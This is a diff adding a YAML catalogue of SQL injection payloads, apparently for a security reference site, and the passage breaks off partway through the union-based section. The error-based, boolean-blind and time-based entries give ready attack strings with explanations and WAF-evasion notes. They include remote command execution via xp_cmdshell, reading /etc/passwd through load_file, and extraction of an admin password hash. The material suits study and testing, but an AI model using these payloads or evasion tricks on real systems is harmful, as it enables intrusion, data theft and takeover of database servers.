@@ -1,0 +1,1523 @@
+slug: sqli
+name: SQL Injection
+owasp: A03:2021 – Injection
+description: 'SQL Injection occurs when user-supplied data is incorporated into a SQL query without proper parameterization
+  or sanitization, allowing an attacker to manipulate the query''s logic. Successful exploitation can lead to unauthorized
+  data disclosure, authentication bypass, data manipulation, and in some configurations, remote code execution via database
+  features. It remains one of the most critical and widespread web application vulnerabilities.
+
+  '
+severity_range:
+  low: CVSS 6.5
+  high: CVSS 9.8
+references:
+- label: OWASP SQL Injection Prevention Cheat Sheet
+  url: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+- label: PortSwigger SQL Injection Research
+  url: https://portswigger.net/web-security/sql-injection
+- label: PayloadsAllTheThings SQLi
+  url: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+groups:
+- slug: error-based
+  name: Error-Based SQL Injection
+  description: Forces the database to return error messages containing query results, allowing data extraction through verbose
+    error output.
+  difficulty: low
+  prerequisites:
+  - Application reflects database error messages to the user
+  - Error verbosity enabled in the database or application
+  payloads:
+  - id: sqli-err-001
+    title: Basic single quote error trigger
+    payload_string: ''''
+    how_it_works: 'Inserting a single apostrophe into a string-based SQL parameter breaks the string delimiter, causing an
+      unmatched quote in the SQL query. Most databases return a syntax error message that reveals the database type, version,
+      and partial query structure. This is the fundamental SQL injection probe used to confirm that a parameter is injectable.
+      The error message itself provides reconnaissance data for crafting more advanced exploitation payloads.
+
+      '
+    prerequisites:
+    - Parameter used in SQL string comparison
+    - Application returns database errors to user
+    waf_bypass_notes: WAFs detect lone single quotes; use %27 URL encoding as alternative
+    severity_context: CVSS 5.3 – confirms SQL injection, reveals database info
+    cve_refs:
+    - CVE-2022-0739
+    tags:
+    - error-based
+    - probe
+    - basic
+    - string-injection
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-err-002
+    title: MySQL extractvalue error-based
+    payload_string: 1 AND extractvalue(1,concat(0x7e,(SELECT version())))
+    how_it_works: 'MySQL''s extractvalue() function performs an XPath query on an XML document. When the XPath expression
+      is invalid, MySQL generates an error message that includes the invalid expression value. By placing a subquery inside
+      concat() as part of the XPath argument, the subquery result appears in the error message. This is a standard MySQL error-based
+      extraction technique that returns one row per injection. The 0x7e hex value is the tilde character, used as a delimiter
+      to identify the extracted data.
+
+      '
+    prerequisites:
+    - MySQL 5.1+ database
+    - Application reflects SQL errors
+    waf_bypass_notes: Replace version() with other queries; use hex encoding for strings
+    severity_context: CVSS 7.5 – extracts arbitrary database data via error messages
+    cve_refs:
+    - CVE-2014-6300
+    tags:
+    - error-based
+    - mysql
+    - extractvalue
+    - xpath
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-err-003
+    title: MySQL updatexml error-based
+    payload_string: 1 AND updatexml(1,concat(0x7e,(SELECT database())),1)
+    how_it_works: 'MySQL''s updatexml() function updates XML content in a field. When provided with an invalid XPath expression,
+      it raises a 1105 error that includes the invalid expression in the error message. The subquery inside concat() with
+      a tilde prefix causes the queried database name to appear in the error. This technique is useful when extractvalue is
+      filtered, providing an alternative error channel. It works on MySQL 5.1+ and returns data limited to 32 characters per
+      call.
+
+      '
+    prerequisites:
+    - MySQL 5.1+ database
+    - Error messages returned to user
+    waf_bypass_notes: Alternate to extractvalue; use when extractvalue is WAF-blocked
+    severity_context: CVSS 7.5 – database name/data extraction via XML error
+    cve_refs:
+    - CVE-2014-6300
+    tags:
+    - error-based
+    - mysql
+    - updatexml
+    - xpath-error
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-err-004
+    title: MSSQL convert error-based
+    payload_string: 1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))
+    how_it_works: 'SQL Server''s CONVERT function, when asked to convert a string to an integer, raises a conversion error
+      that includes the string value being converted. By placing a subquery as the value to convert, the query result appears
+      in the error message. This is the classic MSSQL error-based extraction technique. It extracts the first table name from
+      information_schema.tables and reveals it in the SQL Server error message returned to the application.
+
+      '
+    prerequisites:
+    - Microsoft SQL Server
+    - Application returns SQL Server error messages
+    waf_bypass_notes: Use CAST() as alternative; try different data type targets
+    severity_context: CVSS 7.5 – schema enumeration via SQL Server type conversion error
+    cve_refs:
+    - CVE-2023-34362
+    tags:
+    - error-based
+    - mssql
+    - convert
+    - type-conversion
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-err-005
+    title: Oracle UTL_INADDR error-based
+    payload_string: 1 AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))
+    how_it_works: 'Oracle''s UTL_INADDR package performs network hostname lookups. When provided with an invalid hostname
+      (such as a database query result), it raises an ORA-29257 error including the invalid hostname string. The queried value
+      (current Oracle user in this case) appears in the error message. This technique requires EXECUTE privilege on UTL_INADDR.
+      It is particularly useful in Oracle environments where other error-based techniques do not apply.
+
+      '
+    prerequisites:
+    - Oracle Database
+    - Execute privilege on UTL_INADDR
+    - Application reflects Oracle errors
+    waf_bypass_notes: Requires UTL_INADDR privilege; try XMLType error method as alternative
+    severity_context: CVSS 7.5 – Oracle user enumeration via network function error
+    cve_refs: []
+    tags:
+    - error-based
+    - oracle
+    - utl_inaddr
+    - dns-based
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-err-006
+    title: PostgreSQL cast error-based
+    payload_string: 1 AND 1=CAST((SELECT version()) AS INTEGER)
+    how_it_works: 'PostgreSQL''s CAST operator, when converting a non-numeric string to INTEGER, raises an ERROR including
+      the value that could not be cast. The subquery result (database version string) appears directly in the PostgreSQL error
+      message. This is the primary error-based technique for PostgreSQL. The error message format is consistent across PostgreSQL
+      versions, making this a reliable extraction method when verbose errors are enabled.
+
+      '
+    prerequisites:
+    - PostgreSQL database
+    - Application reflects PostgreSQL error messages
+    waf_bypass_notes: 'Use ::integer cast syntax as alternative: (SELECT version())::integer'
+    severity_context: CVSS 7.5 – PostgreSQL version/data extraction via cast error
+    cve_refs: []
+    tags:
+    - error-based
+    - postgresql
+    - cast
+    - type-error
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-err-007
+    title: MySQL floor rand error-based
+    payload_string: 1 AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables
+      GROUP BY x)a)
+    how_it_works: 'This classic MySQL error-based technique exploits a race condition in GROUP BY with rand(). The floor(rand(0)*2)
+      expression is evaluated twice per row due to MySQL''s optimizer behavior, causing duplicate key errors in the temporary
+      table. The error message includes the concat value which contains the subquery result. This technique works in MySQL
+      versions prior to fixes addressing the non-deterministic function issue. It is particularly useful when extractvalue/updatexml
+      are filtered.
+
+      '
+    prerequisites:
+    - MySQL database (pre-fix versions; may vary by version)
+    - Application reflects SQL errors
+    waf_bypass_notes: Complex query structure; obfuscate with whitespace and comments
+    severity_context: CVSS 7.5 – MySQL race condition error extraction technique
+    cve_refs:
+    - CVE-2014-6300
+    tags:
+    - error-based
+    - mysql
+    - floor-rand
+    - group-by
+    - race-condition
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-err-008
+    title: MSSQL XP_CMDSHELL via error
+    payload_string: '''; EXEC xp_cmdshell(''whoami''); --'
+    how_it_works: 'xp_cmdshell is an extended stored procedure in Microsoft SQL Server that executes operating system commands
+      and returns the output. If enabled (disabled by default in SQL Server 2005+), an attacker with sysadmin privileges or
+      appropriate permissions can execute arbitrary OS commands on the database server. The semicolon terminates the prior
+      SQL statement, xp_cmdshell executes the command, and the double-dash comment suppresses any trailing SQL. This escalates
+      SQLi to Remote Code Execution.
+
+      '
+    prerequisites:
+    - Microsoft SQL Server with xp_cmdshell enabled
+    - Database user has sysadmin or EXECUTE permission
+    - Stacked queries supported
+    waf_bypass_notes: xp_cmdshell is blocked by WAFs; use hex encoding or char() function
+    severity_context: CVSS 9.8 – SQL injection to OS command execution via MSSQL
+    cve_refs: []
+    tags:
+    - error-based
+    - mssql
+    - xp_cmdshell
+    - rce
+    - os-command
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-err-009
+    title: MySQL load_file error disclosure
+    payload_string: 1 AND extractvalue(1,concat(0x7e,load_file('/etc/passwd')))
+    how_it_works: 'MySQL''s load_file() function reads the contents of a file from the server''s filesystem. When used inside
+      an error-based extraction technique like extractvalue, the file contents appear in the error message. This allows reading
+      arbitrary files from the database server if the MySQL process has read permission. The FILE privilege is required for
+      the database user. Reading /etc/passwd reveals system user accounts; more sensitive targets include application config
+      files and SSH keys.
+
+      '
+    prerequisites:
+    - MySQL database with FILE privilege
+    - secure_file_priv not restricting file access
+    - Application reflects SQL errors
+    waf_bypass_notes: 'load_file is often WAF-blocked; use hex path: load_file(0x2f6574632f706173737764)'
+    severity_context: CVSS 8.6 – arbitrary file read from database server via MySQL
+    cve_refs: []
+    tags:
+    - error-based
+    - mysql
+    - load_file
+    - file-read
+    - lfi
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-err-010
+    title: SQLite error-based via json_extract
+    payload_string: 1 AND json_extract('{"x":1}', '$.'+sqlite_version())
+    how_it_works: 'SQLite''s json_extract function returns an error when given an invalid JSON path expression. By concatenating
+      the result of a subquery (like sqlite_version()) into the path argument, the error message reveals the version string.
+      SQLite is common in mobile backends and embedded applications. This error-based technique requires that the application
+      reflect SQLite error messages. SQLite''s simplicity means fewer built-in error extraction functions compared to enterprise
+      databases.
+
+      '
+    prerequisites:
+    - SQLite database
+    - Application reflects SQLite error messages
+    - SQLite version 3.9+ with JSON1 extension
+    waf_bypass_notes: SQLite-specific; WAF rules often target MySQL/MSSQL patterns
+    severity_context: CVSS 6.5 – SQLite version and data extraction via JSON error
+    cve_refs: []
+    tags:
+    - error-based
+    - sqlite
+    - json-extract
+    - mobile-backend
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: boolean-blind
+  name: Boolean-Based Blind SQL Injection
+  description: Infers database contents by asking true/false questions that change the application's observable behavior (different
+    responses for true vs. false conditions).
+  difficulty: medium
+  prerequisites:
+  - Application response differs based on query truth value
+  - No error messages returned to user
+  payloads:
+  - id: sqli-bool-001
+    title: Classic OR 1=1 / AND 1=2 probe
+    payload_string: ''' OR ''1''=''1'
+    how_it_works: 'This payload appends a tautology (always-true condition) to a WHERE clause string comparison. When injected,
+      the WHERE clause becomes: WHERE field=''value'' OR ''1''=''1'', which evaluates to true for every row, returning all
+      records. Comparing the response to a normal request and a false-condition request ('' OR ''1''=''2) reveals boolean
+      behavior. If the responses differ, the parameter is boolean-injectable and can be exploited for blind data extraction.
+      This is also a classic authentication bypass vector.
+
+      '
+    prerequisites:
+    - Parameter used in SQL WHERE clause string comparison
+    - Application returns different results for true vs false conditions
+    waf_bypass_notes: Classic payload; use '%27 OR %271%27=%271' URL encoding
+    severity_context: CVSS 7.5 – authentication bypass and boolean blind probe
+    cve_refs: []
+    tags:
+    - boolean-blind
+    - tautology
+    - auth-bypass
+    - probe
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-bool-002
+    title: Substring binary extraction
+    payload_string: ''' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=''admin'')=''a'' --'
+    how_it_works: 'This payload extracts a single character from the admin user''s password by testing if the first character
+      equals ''a''. The application responds differently for true vs false conditions (different content, redirect, or HTTP
+      status). An attacker iterates through all possible characters for each position, sending one request per character per
+      position. This binary search can extract entire field values. Tools like SQLMap automate this process with optimized
+      character search algorithms.
+
+      '
+    prerequisites:
+    - Boolean condition causes observable response difference
+    - users table with username and password columns (or guessable schema)
+    waf_bypass_notes: Slow extraction; use binary search logic to reduce requests
+    severity_context: CVSS 8.5 – extracts password character-by-character from database
+    cve_refs: []
+    tags:
+    - boolean-blind
+    - data-extraction
+    - substring
+    - character-brute
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-bool-003
+    title: ASCII binary comparison
+    payload_string: ''' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 --'
+    how_it_works: 'By comparing the ASCII code of individual characters to threshold values, an attacker can perform a binary
+      search to extract each character in log2(128)=7 requests instead of 128. The ASCII() function returns the numeric code
+      of the first character; comparing to 64 distinguishes uppercase letters from other characters. This efficient approach
+      reduces the total number of requests needed to extract data, making blind SQLi more practical. The database name is
+      extracted one character at a time.
+
+      '
+    prerequisites:
+    - MySQL or compatible database
+    - Observable boolean response difference
+    waf_bypass_notes: Binary search reduces request count; helps avoid rate limiting
+    severity_context: CVSS 7.5 – efficient character extraction via ASCII binary search
+    cve_refs: []
+    tags:
+    - boolean-blind
+    - ascii
+    - binary-search
+    - efficient
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-bool-004
+    title: CASE WHEN conditional
+    payload_string: ''' AND (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --'
+    how_it_works: 'The CASE WHEN expression allows conditional logic in SQL that returns different values based on a condition.
+      This payload tests a simple tautology (1=1) to confirm boolean injection behavior. For actual extraction, the condition
+      would be replaced with a subquery comparing extracted characters to known values. CASE WHEN is supported across MySQL,
+      MSSQL, PostgreSQL, and Oracle, making it a database-agnostic blind injection technique.
+
+      '
+    prerequisites:
+    - SQL injection in any major RDBMS
+    - Observable boolean response difference
+    waf_bypass_notes: Database-agnostic; use whitespace variations to evade WAF
+    severity_context: CVSS 7.5 – cross-database boolean condition injection
+    cve_refs: []
+    tags:
+    - boolean-blind
+    - case-when
+    - cross-database
+    - conditional
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-bool-005
+    title: IF() function extraction (MySQL)
+    payload_string: ''' AND IF((SELECT count(*) FROM users)>0,1,0)=1 --'
+    how_it_works: 'MySQL''s IF(condition, true_value, false_value) function provides a ternary operator in SQL. When used
+      in boolean blind injection, a true condition returns 1 (making the outer comparison true) and a false condition returns
+      0 (making it false). This payload confirms whether the users table exists and has records. The IF function is more readable
+      than nested CASE WHEN expressions and is specific to MySQL/MariaDB syntax.
+
+      '
+    prerequisites:
+    - MySQL or MariaDB database
+    - Observable boolean response
+    waf_bypass_notes: IF() is MySQL-specific; replace with CASE WHEN for other databases
+    severity_context: CVSS 7.5 – MySQL IF-based table existence confirmation
+    cve_refs: []
+    tags:
+    - boolean-blind
+    - mysql
+    - if-function
+    - table-enumeration
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-bool-006
+    title: Conditional error boolean (MSSQL)
+    payload_string: '''; IF (SELECT count(*) FROM sys.tables WHERE name=''users'')>0 WAITFOR DELAY ''0:0:5'' --'
+    how_it_works: 'This hybrid boolean/time-based technique in MSSQL uses IF to branch: if the condition is true, a WAITFOR
+      DELAY introduces a measurable time delay; if false, the query returns immediately. By measuring response time, the attacker
+      infers the boolean result. It first confirms that the users table exists. Subsequent queries extract schema and data.
+      WAITFOR DELAY is preferred over SLEEP (MySQL) in MSSQL environments.
+
+      '
+    prerequisites:
+    - Microsoft SQL Server
+    - Stacked queries supported
+    - Response time measurable by attacker
+    waf_bypass_notes: WAITFOR DELAY is commonly WAF-blocked; consider alternate delay methods
+    severity_context: CVSS 7.5 – MSSQL conditional time-boolean hybrid for schema enumeration
+    cve_refs: []
+    tags:
+    - boolean-blind
+    - mssql
+    - waitfor
+    - hybrid-time
+    - schema-enum
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-bool-007
+    title: Boolean injection in cookie parameter
+    payload_string: trackingId=abc' AND '1'='1
+    how_it_works: 'SQL injection vulnerabilities often exist in non-obvious parameter locations such as cookies. Tracking
+      cookies, session IDs passed as custom cookies, and preference cookies may be used in SQL queries without proper parameterization.
+      By injecting a boolean condition into a cookie value, the attacker can test for SQL injection in a location that may
+      not be guarded by WAF rules focused on GET/POST parameters. Different page content for true vs. false confirms injection.
+
+      '
+    prerequisites:
+    - Cookie value used in SQL query
+    - Cookie value not parameterized
+    waf_bypass_notes: Cookie parameters often have weaker WAF inspection than query params
+    severity_context: CVSS 7.5 – SQLi in cookie parameter, commonly overlooked
+    cve_refs: []
+    tags:
+    - boolean-blind
+    - cookie-injection
+    - non-obvious-vector
+    - parameter-location
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-bool-008
+    title: JSON field boolean injection
+    payload_string: '{"username": "admin'' AND ''1''=''1", "password": "x"}'
+    how_it_works: 'Modern web applications that accept JSON request bodies may pass JSON field values directly into SQL queries.
+      If the username field value is incorporated into a SQL WHERE clause without parameterization, injecting boolean logic
+      into the JSON field value achieves SQL injection. WAF rules focused on URL parameters or form fields may not inspect
+      JSON request bodies with the same rigor. This is a common oversight in REST APIs.
+
+      '
+    prerequisites:
+    - JSON API endpoint passes field values to SQL
+    - No parameterized queries for JSON-sourced values
+    waf_bypass_notes: JSON body injection may bypass WAFs configured for form parameters
+    severity_context: CVSS 8.5 – SQL injection via JSON request body
+    cve_refs: []
+    tags:
+    - boolean-blind
+    - json-injection
+    - rest-api
+    - body-injection
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-bool-009
+    title: Second-order boolean extraction
+    payload_string: admin'--
+    how_it_works: 'A second-order SQL injection occurs when user input is safely stored but later retrieved and used in a
+      new SQL query without parameterization. The payload stores the value ''admin''--'' in a registration field. When the
+      application later retrieves and uses this value (e.g., in a profile update query), the injected SQL comment truncates
+      the query. If the truncated query performs a different action than intended, the attacker can infer boolean conditions
+      from the application''s behavior.
+
+      '
+    prerequisites:
+    - Application stores input safely but uses it unsafely in subsequent queries
+    - Observable behavior difference in downstream functionality
+    waf_bypass_notes: Second-order injection is stored at write time; WAF may miss the trigger
+    severity_context: CVSS 7.5 – second-order injection via stored credentials
+    cve_refs: []
+    tags:
+    - boolean-blind
+    - second-order
+    - stored
+    - deferred-injection
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-bool-010
+    title: Boolean with ORDER BY inference
+    payload_string: 1 ORDER BY (CASE WHEN (1=1) THEN name ELSE id END)
+    how_it_works: 'When injecting into an ORDER BY clause, boolean conditions can change the sort order of results. A true
+      condition sorts by one column; a false condition sorts by a different column. If results appear in a predictable order,
+      the attacker infers boolean truth by observing which record appears first. This technique works when other boolean injection
+      methods fail because ORDER BY injection has different parsing context than WHERE clause injection. It is a less commonly
+      tested vector.
+
+      '
+    prerequisites:
+    - Injection point is in ORDER BY clause
+    - Result ordering is observable and predictable
+    waf_bypass_notes: ORDER BY injection context is often missed by automated scanners
+    severity_context: CVSS 6.5 – boolean inference via ORDER BY column switching
+    cve_refs: []
+    tags:
+    - boolean-blind
+    - order-by
+    - column-inference
+    - non-standard-context
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: time-based
+  name: Time-Based Blind SQL Injection
+  description: Infers database contents by injecting conditional time delays — queries that pause execution if a condition
+    is true, measured by the attacker.
+  difficulty: medium
+  prerequisites:
+  - No visible response difference between true and false conditions
+  - Response time measurable by attacker
+  - Database supports time delay functions
+  payloads:
+  - id: sqli-time-001
+    title: MySQL SLEEP basic probe
+    payload_string: ''' AND SLEEP(5) --'
+    how_it_works: 'MySQL''s SLEEP(n) function pauses execution for n seconds. When injected as a boolean condition, the query
+      delays the response by 5 seconds if evaluated (i.e., if the injection was successful). Comparing normal response time
+      to the delayed response confirms time-based blind SQL injection. No response content change is needed — only the timing
+      difference matters. This is the first step in time-based blind exploitation.
+
+      '
+    prerequisites:
+    - MySQL or MariaDB database
+    - HTTP timeout not shorter than sleep duration
+    waf_bypass_notes: SLEEP() is commonly WAF-blocked; use BENCHMARK() or custom delays
+    severity_context: CVSS 7.5 – confirms MySQL injection via measurable time delay
+    cve_refs:
+    - CVE-2022-0739
+    tags:
+    - time-based
+    - mysql
+    - sleep
+    - probe
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-time-002
+    title: MySQL conditional SLEEP
+    payload_string: ''' AND IF(1=1,SLEEP(5),0) --'
+    how_it_works: 'The IF() function makes the SLEEP conditional — it only delays if the condition is true. By replacing 1=1
+      with a data-extracting condition like ASCII(SUBSTRING(password,1,1))>64, the attacker extracts data one bit at a time
+      based on whether the delay occurs. This is the core of time-based blind extraction. Using binary search on ASCII values,
+      complete field values can be extracted with logarithmically fewer requests than character-by-character comparison.
+
+      '
+    prerequisites:
+    - MySQL database
+    - Stable network with measurable response times
+    waf_bypass_notes: IF(1=1,SLEEP(5),0) combination may be pattern-matched; reorder operands
+    severity_context: CVSS 7.5 – conditional time delay for precise data extraction
+    cve_refs:
+    - CVE-2022-0739
+    tags:
+    - time-based
+    - mysql
+    - conditional-sleep
+    - data-extraction
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-time-003
+    title: PostgreSQL pg_sleep
+    payload_string: '''; SELECT pg_sleep(5) --'
+    how_it_works: 'PostgreSQL''s pg_sleep(seconds) function delays query execution. When stacked queries are supported, appending
+      a SELECT pg_sleep() with a semicolon introduces a measurable delay in the HTTP response. For conditional extraction,
+      pg_sleep is wrapped in a CASE WHEN expression: SELECT CASE WHEN (condition) THEN pg_sleep(5) ELSE pg_sleep(0) END. PostgreSQL''s
+      precise timing functions make this reliable for data extraction in the absence of visible output channels.
+
+      '
+    prerequisites:
+    - PostgreSQL database
+    - Stacked queries supported or pg_sleep callable in expression context
+    waf_bypass_notes: pg_sleep commonly WAF-blocked; use generate_series() as delay alternative
+    severity_context: CVSS 7.5 – PostgreSQL time-based blind injection via pg_sleep
+    cve_refs: []
+    tags:
+    - time-based
+    - postgresql
+    - pg_sleep
+    - stacked-query
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-time-004
+    title: MSSQL WAITFOR DELAY
+    payload_string: '''; WAITFOR DELAY ''0:0:5'' --'
+    how_it_works: 'SQL Server''s WAITFOR DELAY statement pauses execution for a specified duration in HH:MM:SS format. Unlike
+      MySQL''s SLEEP which is a function, WAITFOR is a statement requiring stacked query support. The time delay is measurable
+      from the HTTP response time. Conditional extraction uses: IF condition WAITFOR DELAY ''0:0:5''. This technique is the
+      standard time-based blind method for MSSQL and works across all modern SQL Server versions.
+
+      '
+    prerequisites:
+    - Microsoft SQL Server
+    - Stacked queries supported
+    waf_bypass_notes: WAITFOR DELAY is a well-known signature; use hex-encoded string 0x303a303a35
+    severity_context: CVSS 7.5 – MSSQL time-based blind injection via WAITFOR
+    cve_refs: []
+    tags:
+    - time-based
+    - mssql
+    - waitfor-delay
+    - stacked-query
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-time-005
+    title: Oracle heavy query delay
+    payload_string: ''' AND 1=(SELECT count(*) FROM all_objects a, all_objects b) --'
+    how_it_works: 'Oracle does not have a built-in sleep function accessible without special privileges. Instead, a heavy
+      query that performs a large Cartesian join can introduce significant delays. Selecting from all_objects (which contains
+      thousands of rows) joined with itself creates a cross-product with millions of rows, taking several seconds to execute.
+      The delay is dependent on the number of objects in the database. This technique is less precise than SLEEP but is effective
+      in Oracle environments without UTL_HTTP access.
+
+      '
+    prerequisites:
+    - Oracle Database
+    - Read access to all_objects view
+    waf_bypass_notes: Heavy query; no sleep keyword; bypasses keyword-based WAF rules
+    severity_context: CVSS 6.5 – Oracle time delay via heavy Cartesian query
+    cve_refs: []
+    tags:
+    - time-based
+    - oracle
+    - heavy-query
+    - cartesian-join
+    - no-sleep
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-time-006
+    title: MySQL BENCHMARK delay
+    payload_string: ''' AND BENCHMARK(5000000,MD5(1)) --'
+    how_it_works: 'MySQL''s BENCHMARK(count, expr) function repeats an expression a specified number of times, creating CPU
+      load that translates to measurable delay. Unlike SLEEP() which is often WAF-blocked, BENCHMARK uses a different function
+      name. Performing 5 million MD5 hash computations introduces a delay of approximately 2-5 seconds depending on server
+      hardware. The delay is hardware-dependent, making precise timing harder, but it is an effective SLEEP() alternative
+      when SLEEP is blocked.
+
+      '
+    prerequisites:
+    - MySQL or MariaDB database
+    - BENCHMARK not blocked
+    waf_bypass_notes: BENCHMARK bypasses WAFs that only block SLEEP; adjust count for timing
+    severity_context: CVSS 7.5 – CPU-based delay via MySQL BENCHMARK as SLEEP bypass
+    cve_refs: []
+    tags:
+    - time-based
+    - mysql
+    - benchmark
+    - sleep-bypass
+    - cpu-delay
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-time-007
+    title: Time-based blind in XML/XPath injection
+    payload_string: x' or 1=1 or 'x'='y
+    how_it_works: 'Some applications use XPath queries with user input in XML-backed databases. Time-based inference can be
+      applied to XPath injection by chaining conditions that affect execution time through recursive or complex XPath expressions.
+      While true database SLEEP functions are not available in XPath, complex nested queries against large XML documents can
+      introduce measurable delays. This technique bridges SQLi timing concepts to XPath injection contexts.
+
+      '
+    prerequisites:
+    - Application uses XPath queries against XML data
+    - User input incorporated into XPath expression
+    waf_bypass_notes: XPath injection differs from SQL; standard SQL WAF rules may not apply
+    severity_context: CVSS 6.5 – XPath injection with timing inference
+    cve_refs: []
+    tags:
+    - time-based
+    - xpath
+    - xml
+    - non-sql-db
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-time-008
+    title: SQLite randomblob heavy query delay
+    payload_string: ''' AND 1=(SELECT count(*) FROM (SELECT randomblob(500000000))) --'
+    how_it_works: 'SQLite''s randomblob(N) function generates N random bytes. Generating 500MB of random data requires significant
+      CPU and memory, introducing a measurable delay. When used in a subquery with count(*), the delay is proportional to
+      the blob size. SQLite lacks a dedicated sleep function, making this the primary time-based delay technique for SQLite.
+      The count(*) wrapper prevents the large data from being returned as part of the query result, avoiding size-based detection.
+
+      '
+    prerequisites:
+    - SQLite database
+    - Sufficient memory on server for blob generation
+    waf_bypass_notes: SQLite-specific; randomblob is not in typical WAF signatures
+    severity_context: CVSS 6.5 – SQLite time delay via memory-intensive blob generation
+    cve_refs: []
+    tags:
+    - time-based
+    - sqlite
+    - randomblob
+    - cpu-delay
+    - no-sleep
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-time-009
+    title: Conditional time extraction of password hash
+    payload_string: ''' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username=''admin''),1,1))=109,SLEEP(5),0)
+      --'
+    how_it_works: 'This payload tests whether the first character of the admin user''s password hash has ASCII value 109 (the
+      letter ''m''). If true, the 5-second delay occurs; if false, the response is immediate. By iterating over all possible
+      ASCII values or using binary search, each character of the password hash is extracted one at a time. This fully automates
+      to a complete hash extraction, which can then be cracked offline. SQLMap''s --technique=T automates this process.
+
+      '
+    prerequisites:
+    - MySQL with users table containing username/password columns
+    - Measurable response timing
+    waf_bypass_notes: Full extraction query; use SQLMap --technique=T for automation
+    severity_context: CVSS 8.5 – full password hash extraction via time-based blind
+    cve_refs:
+    - CVE-2022-0739
+    tags:
+    - time-based
+    - mysql
+    - hash-extraction
+    - data-extraction
+    - automated
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-time-010
+    title: Time-based via HTTP header injection
+    payload_string: 'X-Forwarded-For: 127.0.0.1'' AND SLEEP(5) --'
+    how_it_works: 'HTTP headers that are logged and queried in the database (such as X-Forwarded-For for IP-based access control,
+      or User-Agent for analytics) may be injectable. When the header value is used in a SQL query without parameterization,
+      time-based blind injection through headers is possible. This vector bypasses security controls focused on form parameters
+      and URL query strings. The injected SLEEP confirms the time-based injection without any visible response change.
+
+      '
+    prerequisites:
+    - HTTP header value used in SQL query
+    - No parameterization for header-sourced values
+    waf_bypass_notes: Header parameters often bypass WAF rules targeting body/query params
+    severity_context: CVSS 7.5 – time-based blind SQLi via HTTP header
+    cve_refs: []
+    tags:
+    - time-based
+    - http-header
+    - x-forwarded-for
+    - non-standard-vector
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: union-based
+  name: UNION-Based SQL Injection
+  description: Uses UNION SELECT statements to append attacker-controlled query results to the original query, directly embedding
+    extracted data in the application response.
+  difficulty: low
+  prerequisites:
+  - Query results are displayed in the application response
+  - Number of columns in original query known or determinable
+  - Data types are compatible between original and injected queries
+  payloads:
+  - id: sqli-union-001
+    title: Column count determination with ORDER BY
+    payload_string: ''' ORDER BY 1 --'
+    how_it_works: 'Before executing a UNION SELECT, the attacker must determine the number of columns in the original query.
+      The ORDER BY technique increments the column index until the database returns an error (column index out of range).
+      If ORDER BY 3 succeeds but ORDER BY 4 returns an error, the original query has 3 columns. This is a prerequisite for
+      UNION injection and can be performed silently without UNION SELECT. The ORDER BY approach is often less detected than
+      NULL column probing.
+
+      '
+    prerequisites:
+    - ORDER BY not blocked in injection context
+    - Error messages returned for invalid column index
+    waf_bypass_notes: ORDER BY technique is quieter than UNION NULL probing
+    severity_context: CVSS 5.3 – column count enumeration for UNION attack setup
+    cve_refs:
+    - CVE-2014-3704
+    tags:
+    - union-based
+    - column-count
+    - order-by
+    - reconnaissance
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-union-002
+    title: UNION SELECT NULL column probe
+    payload_string: ''' UNION SELECT NULL,NULL,NULL --'
+    how_it_works: 'The UNION SELECT NULL technique probes for the correct number of columns. NULL is type-compatible with
+      any column type, avoiding type mismatch errors. An attacker starts with one NULL and adds more until no error occurs,
+      indicating the correct column count. Once found, individual NULLs are replaced with data-extracting expressions. This
+      is the most reliable column count technique because it avoids ORDER BY restrictions in some contexts (e.g., queries
+      with UNION already).
+
+      '
+    prerequisites:
+    - UNION SELECT not blocked
+    - Application returns query results in response
+    waf_bypass_notes: UNION SELECT is heavily WAF-targeted; use URL encoding and whitespace
+    severity_context: CVSS 5.3 – NULL-based column count determination
+    cve_refs:
